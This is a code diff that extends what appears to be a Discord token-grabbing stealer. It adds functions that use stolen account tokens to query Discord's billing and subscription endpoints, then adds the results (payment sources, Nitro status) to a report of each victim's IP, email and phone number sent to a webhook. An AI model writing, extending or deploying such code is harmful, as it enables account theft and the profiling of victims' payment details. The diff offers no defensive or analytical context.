@@ -116,6 +116,34 @@ def VerifiedCheck(token):
     verified = bool(verified)
     return verified
 
+def BillingCheck(token):
+    headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json'
+    }
+    info = get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
+    if len(info) > 0:
+        return True
+    else:
+        return False
+
+def NitroCheck(token):
+    headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json'
+    }
+
+
+    has_nitro = False
+    res = get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
+    nitro_data = res.json()
+    has_nitro = bool(len(nitro_data) > 0)
+    if has_nitro:
+        has_nitro = True
+    else:
+        has_nitro = False
+    return has_nitro
+
 def GetLocale(token):
     languages = {
         'da'    : 'Danish, Denmark',
@@ -178,6 +206,8 @@ def SendTokens(webhook_url, tokens_grabbed = None):
         email = GetEmail(token)
         phone_number = GetPhoneNumber(token)
         verified_check = VerifiedCheck(token)
+        billing = BillingCheck(token)
+        nitro = NitroCheck(token)
         locale = GetLocale(token)[0]
         language = GetLocale(token)[1]
         
@@ -190,6 +220,8 @@ Ip Address = {ip_address}
 Email      = {email}
 Phone      = {phone_number}
 Verified   = {verified_check}
+Billing    = {billing}
+Nitro      = {nitro}
 Locale     = {locale}
 Language   = {language}'''
 
